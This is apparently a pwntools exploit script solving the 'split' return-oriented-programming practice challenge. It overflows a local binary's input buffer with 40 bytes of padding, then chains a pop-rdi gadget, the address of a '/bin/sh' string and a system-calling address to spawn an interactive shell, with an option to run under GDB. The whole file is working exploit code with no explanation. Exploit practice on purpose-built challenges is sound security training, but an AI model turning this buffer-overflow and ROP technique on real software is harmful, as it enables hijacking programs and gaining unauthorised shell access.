#!/usr/bin/env python3
from pwn import p64, process, gdb, args

if args.GDB:
    p = gdb.debug("./split", """
    b *pwnme+88
    continue    
    """)
else:
    p = process("./split")

win = 0x40074b
bin_sh = 0x601060
pop_rdi = 0x4007c3
payload = b"A"*40 + p64(pop_rdi) + p64(bin_sh) + p64(win)
p.recvuntil(b"> ")
p.send(payload)
p.interactive()
